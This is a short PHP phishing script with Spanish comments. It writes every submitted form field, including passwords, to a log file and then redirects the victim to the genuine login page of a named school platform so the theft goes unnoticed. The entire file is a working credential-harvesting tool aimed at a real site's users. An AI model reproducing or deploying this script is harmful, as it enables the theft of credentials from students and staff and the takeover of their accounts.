<?php
	//@Naiv_Sec&Inf
	header ('Location: https://fretacalella.clickedu.eu/user.php?action=login'); //La URL a redireccionar tiene que estar luego de Location:
	$handle = fopen("log.txt", "a"); //Aquí se abre el archivo donde se va a guardar la contraseña
	//A partír de aquí se escriben las variables que obtiene luego del POST
	foreach($_POST as $variable => $value) {
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle); //Se cierra el documento donde se guardan las contraseñas
	exit;
	//@Naiv_Sec&Inf
?>